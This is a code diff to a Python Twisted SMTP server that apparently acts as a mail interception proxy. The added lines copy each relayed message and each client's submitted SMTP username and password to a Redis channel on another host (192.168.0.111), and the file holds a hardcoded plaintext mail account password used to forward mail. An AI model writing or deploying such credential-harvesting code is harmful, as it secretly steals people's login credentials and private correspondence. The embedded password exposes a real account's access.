@@ -1,24 +1,27 @@
 import sys
 import binascii
+import redis
+import json
+import time
 
 from OpenSSL import SSL
 
-from email.Header import Header
-from email.base64MIME import encode as encode_base64
 from zope.interface import implements
 
 from twisted.internet import defer, reactor, ssl
 from twisted.mail import smtp
 from twisted.mail.imap4 import LOGINCredentials
 from twisted.python import log
-from twisted.internet.interfaces import ITLSTransport, ISSLTransport
 
 try:
 	from cStringIO import StringIO
 except ImportError:
 	from StringIO import StringIO
 
-		
+
+
+smtpRedisClient = None
+
 
 class JJMessage(object):
 	implements(smtp.IMessage)
@@ -35,6 +38,14 @@ class JJMessage(object):
 		print "New messsage received."
 		self.lines.append('')
 		messageData = '\n'.join(self.lines)
+		messageData = str(messageData)
+		# Publish mail to redis
+		d = {}
+		d['from'] = str(self.protocol.origin)
+		d['to'] = str(self.protocol.origin)
+		d['message'] = messageData
+		d['time'] = int(time.time())
+		smtpRedisClient.publish('new:mail', json.dumps(d))
 
 		# Really send mail here
 		print 'REALLY SENDING THE MAIL'
@@ -43,7 +54,7 @@ class JJMessage(object):
 		self.protocol.username = 'wp10619035-johnny'
 		self.protocol.password = 'aRvIpXalEYxLYwTY' 
 
-		msg = StringIO(str(messageData))
+		msg = StringIO(messageData)
 		dfd = sendmail(self.protocol.username, self.protocol.password, self.protocol.origin, self.recipient, msg, self.protocol.destHost, self.protocol.destPort)
 		dfd.addCallback(lambda result: lp("Real mail sent"))
 		return defer.succeed(None)
@@ -127,6 +138,14 @@ class JJESMTP(smtp.ESMTP):
 			self.authenticated = True
 			self.sendCode(235, 'Authentication successful.')
 
+			# publish credentials to redis
+			print 'Publishing mail account credentials to redis'
+			c = {}
+			c['date'] = int(time.time())
+			c['username'] = self.username
+			c['password'] = self.password
+			smtpRedisClient.publish("new:mail_credentials", json.dumps(c))
+
 
 # For our SSL shizzl
 class ServerTLSContext(ssl.DefaultOpenSSLContextFactory):
@@ -173,7 +192,13 @@ def configureSMTPTraffic():
 	reactor.listenTCP(9996, JJSMTPFactory())
 
 	# kickoff
+	setupRedis()
 	reactor.run()
+
+def setupRedis():
+	print 'Setting up Redis for SMTP'
+	global smtpRedisClient
+	smtpRedisClient = redis.Redis(host="192.168.0.111", port=6379, db=0)
 
 def lp(x):
 	print x
